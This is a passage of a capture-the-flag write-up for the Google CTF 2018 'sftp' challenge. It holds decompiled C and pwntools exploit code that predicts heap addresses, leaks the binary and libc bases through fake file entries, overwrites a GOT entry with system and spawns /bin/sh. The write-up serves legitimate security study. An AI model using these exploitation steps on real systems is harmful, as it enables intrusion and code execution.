</span></span><span class=line><span class=cl>      <span class=n>v6</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>flag_entry</span><span class=o>-&gt;</span><span class=n>data</span><span class=p>[</span><span class=n>v5</span><span class=o>++</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=o>*</span><span class=n>v6</span> <span class=o>^=</span> <span class=mh>0x89u</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span> <span class=n>flag_entry</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>&gt;</span> <span class=n>v5</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nf>new_dir_no_parent</span><span class=p>(</span><span class=s>&#34;src&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=o>*</span><span class=nf>new_entry</span><span class=p>(</span><span class=s>&#34;src/sftp.c&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v8</span> <span class=o>=</span> <span class=n>sftp_c_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v7</span><span class=o>-&gt;</span><span class=n>entry</span><span class=p>.</span><span class=n>type</span> <span class=o>=</span> <span class=n>FILE_ENTRY</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v7</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>=</span> <span class=n>v8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v9</span> <span class=o>=</span> <span class=nf>rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>v10</span> <span class=o>=</span> <span class=n>sftp_c_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v11</span> <span class=o>=</span> <span class=p>(</span><span class=n>v9</span> <span class=o>&amp;</span> <span class=mh>0x1FFFFFFF</span> <span class=o>|</span> <span class=mh>0x40000000LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v7</span><span class=o>-&gt;</span><span class=n>data</span> <span class=o>=</span> <span class=n>v11</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=nf>memcpy</span><span class=p>(</span><span class=n>v11</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>xored_sftp_c</span><span class=p>,</span> <span class=n>v10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v7</span><span class=o>-&gt;</span><span class=n>size</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>do</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>v13</span> <span class=o>=</span> <span class=n>result</span> <span class=o>+</span> <span class=n>v7</span><span class=o>-&gt;</span><span class=n>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>result</span> <span class=o>=</span> <span class=p>(</span><span class=n>result</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=o>*</span><span class=n>v13</span> <span class=o>^=</span> <span class=mh>0x37u</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span> <span class=n>v7</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>&gt;</span> <span class=n>result</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>As you can see the user directory is created with new_dir as a regular directory (with the parent directory = home_entry).</p><p>The user_entry address is also the first address returned by malloc.
We can predict it in the following manner:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>CDLL</span><span class=p>(</span><span class=s1>&#39;libc.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>srand</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>malloc</span> <span class=o>=</span> <span class=k>lambda</span> <span class=p>:</span> <span class=mh>0x40000000</span> <span class=o>|</span> <span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>rand</span><span class=p>()</span> <span class=o>&amp;</span> <span class=mh>0x01fffffff</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>user_entry_addr</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;Predicted user entry @ 0x</span><span class=si>{:08x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>user_entry_addr</span><span class=p>))</span>
</span></span></code></pre></div><p>We must do this also for the other addresses returned by malloc that we want to predict simply invoking the malloc lambda in the script the same times as malloc is called in the binary.</p><p>The home_entry structure is in <code>.data</code>, so we can use the address of the user directory as the fake entry to leak the home_entry address and bypass PIE.</p><p>So let’s write a piece of code to leak PIE (using pwntools):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Putting fake leak entry&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak_entry</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># parent_directory, don&#39;t care</span>
</span></span><span class=line><span class=cl><span class=n>leak_entry</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># type = FILE_ENTRY</span>
</span></span><span class=line><span class=cl><span class=n>leak_entry</span> <span class=o>+=</span> <span class=s1>&#39;leak&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>20</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=c1># name</span>
</span></span><span class=line><span class=cl><span class=n>leak_entry</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=c1># size = 8</span>
</span></span><span class=line><span class=cl><span class=n>leak_entry</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>user_entry_addr</span><span class=p>)</span> <span class=c1># data = user_entry_addr-&gt;parent_directory</span>
</span></span><span class=line><span class=cl><span class=c1># printing the content of leak will print the home_entry address (in .bss)</span>
</span></span><span class=line><span class=cl><span class=n>put_file</span><span class=p>(</span><span class=s1>&#39;leak_entry&#39;</span><span class=p>,</span> <span class=n>leak_entry</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Overflowing directory (leak)&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dirname</span>  <span class=o>=</span> <span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>20</span> <span class=o>+</span> <span class=mi>8</span> <span class=o>+</span> <span class=mi>17</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span> <span class=c1># name + size + 17 entry*</span>
</span></span><span class=line><span class=cl><span class=n>dirname</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>leak_entry_addr</span><span class=p>)</span> <span class=c1># 18th fake entry</span>
</span></span><span class=line><span class=cl><span class=n>send_cmd</span><span class=p>(</span><span class=s1>&#39;mkdir &#39;</span> <span class=o>+</span> <span class=n>dirname</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Triggering directory reallocation (leak)&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>trunc_dirname</span> <span class=o>=</span> <span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mi>20</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\x10</span><span class=s1>&#39;</span> <span class=c1># ls command list the directory with a truced name</span>
</span></span><span class=line><span class=cl><span class=n>send_cmd</span><span class=p>(</span><span class=s1>&#39;cd &#39;</span> <span class=o>+</span> <span class=n>trunc_dirname</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># the first 17 entries are zeored with memset, we must insert dummy entries to reach the 18th entry</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>17</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>put_file</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>),</span> <span class=s1>&#39;A&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Leaking binary base&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>get_file</span><span class=p>(</span><span class=s1>&#39;leak&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x208be0</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;@ 0x</span><span class=si>{:012x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>base</span><span class=p>))</span>
</span></span></code></pre></div><p>With a leak of the base address we can repeat the previous procedure to print values from the GOT and try to find the libc.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Putting fake GOT entry&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>got_entry</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># parent_directory, don&#39;t care</span>
</span></span><span class=line><span class=cl><span class=n>got_entry</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># type = FILE_ENTRY</span>
</span></span><span class=line><span class=cl><span class=n>got_entry</span> <span class=o>+=</span> <span class=s1>&#39;got&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>20</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=c1># name</span>
</span></span><span class=line><span class=cl><span class=n>got_entry</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>2</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span> <span class=c1># size</span>
</span></span><span class=line><span class=cl><span class=n>got_entry</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>base</span> <span class=o>+</span> <span class=mh>0x205018</span> <span class=o>+</span> <span class=mi>192</span><span class=p>)</span> <span class=c1># data = start of GOT + 192 (frwite entry)</span>
</span></span><span class=line><span class=cl><span class=n>put_file</span><span class=p>(</span><span class=s1>&#39;got_entry&#39;</span><span class=p>,</span> <span class=n>got_entry</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Overflowing directory (GOT)&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dirname</span>  <span class=o>=</span> <span class=s1>&#39;B&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>20</span> <span class=o>+</span> <span class=mi>8</span> <span class=o>+</span> <span class=mi>17</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span> <span class=c1># name + size + 17 entry*</span>
</span></span><span class=line><span class=cl><span class=n>dirname</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>got_entry_addr</span><span class=p>)</span> <span class=c1># 18th fake entry</span>
</span></span><span class=line><span class=cl><span class=n>send_cmd</span><span class=p>(</span><span class=s1>&#39;mkdir &#39;</span> <span class=o>+</span> <span class=n>dirname</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Triggering directory reallocation (GOT)&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>trunc_dirname</span> <span class=o>=</span> <span class=s1>&#39;B&#39;</span><span class=o>*</span><span class=mi>20</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\x10</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>send_cmd</span><span class=p>(</span><span class=s1>&#39;cd &#39;</span> <span class=o>+</span> <span class=n>trunc_dirname</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>17</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>put_file</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>),</span> <span class=s1>&#39;A&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>got</span> <span class=o>=</span> <span class=n>get_file</span><span class=p>(</span><span class=s1>&#39;got&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>got</span><span class=p>),</span> <span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>got</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>8</span><span class=p>])))</span>
</span></span></code></pre></div><p>With this snippet we can print the address of fwrite and rand, the last 2 GOT entries.</p><p>With a quick lookup in our libc database I found that we have a match with Ubuntu GLIBC 2.23-0ubuntu9 (you can found it in the attached zip file)</p><p>What&rsquo;s next? With the fake entry for the got that we have created before we can use put_file to overwrite the fwrite entry with system.</p><p>fwrite is used in writen and writen is called in handle_get.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>handle_get</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>path</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>file_entry</span><span class=o>*</span> <span class=n>file</span> <span class=o>=</span> <span class=nf>find_file</span><span class=p>(</span><span class=n>path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>file</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%zu</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>file</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>writen</span><span class=p>(</span><span class=n>file</span><span class=o>-&gt;</span><span class=n>data</span><span class=p>,</span> <span class=n>file</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>);</span> <span class=c1>//calls fwrite(file-&gt;data, ...)
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;File </span><span class=se>\&#34;</span><span class=s>%s</span><span class=se>\&#34;</span><span class=s> not found.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nb>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>So if fwrite() is now in fact system() and the argument passed to the call in writen is file->data we must create a file that contains the command that we want execute.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>libc_bin</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>got</span><span class=p>[:</span><span class=mi>8</span><span class=p>])</span> <span class=o>-</span> <span class=n>libc_bin</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;fwrite&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc base address: 0x</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>libc_bin</span><span class=o>.</span><span class=n>address</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>put_file</span><span class=p>(</span><span class=s2>&#34;cmd&#34;</span><span class=p>,</span> <span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_bin</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;system&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>put_file</span><span class=p>(</span><span class=s2>&#34;got&#34;</span><span class=p>,</span> <span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;get cmd&#34;</span><span class=p>)</span> <span class=c1>#system(&#34;/bin/sh&#34;)</span>
</span></span></code></pre></div><p>And win!</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=sftp_8 srcset="/img/sftp_writeup/sftp_8_hu_9e9f2063219f7bf1.png 330w,
/img/sftp_writeup/sftp_8_hu_d5e4b43348c3da35.png 660w,
/img/sftp_writeup/sftp_8_hu_4b098b62a4298910.png 1280w" data-zoom-src=/img/sftp_writeup/sftp_8.png src=/img/sftp_writeup/sftp_8.png></figure></p><p>In the following link to a zip file you can find the sftp.c source code, the sftp binary, the full exploit, the libc binary and the header that must be imported in IDA.</p><p>Attachment: <a href="https://drive.google.com/file/d/1O0-QFmp7KQ1ojANU5y75ouv6hFhm4QD0/view?usp=sharing" target=_blank>https://drive.google.com/file/d/1O0-QFmp7KQ1ojANU5y75ouv6hFhm4QD0/view?usp=sharing</a></p></div></div><script type=text/javascript src=/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_writeups/2018-06-29-google-ctf-2018-sftp/index.md data-oid-likes=likes_writeups/2018-06-29-google-ctf-2018-sftp/index.md></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group mr-3" href=/writeups/2018-06-27-google-ctf-2018-keygenme/><span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&larr;</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">KEYGENME - Google CTF 2018</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2018-06-27T00:00:00+00:00>27 June 2018</time>
</span></span></a></span><span><a class="flex text-right group ml-3" href=/writeups/2018-06-29-google-ctf-2018-execve-sandbox/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">EXECVE SANDBOX - Google CTF 2018</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2018-06-29T00:00:00+00:00>29 June 2018</time>
</span></span><span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&larr;</span></a></span></div></div></footer></article><div id=top-scroller class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex flex-col list-none sm:flex-row"><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href title></a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
mhackeroni</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://mhackeroni.it/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>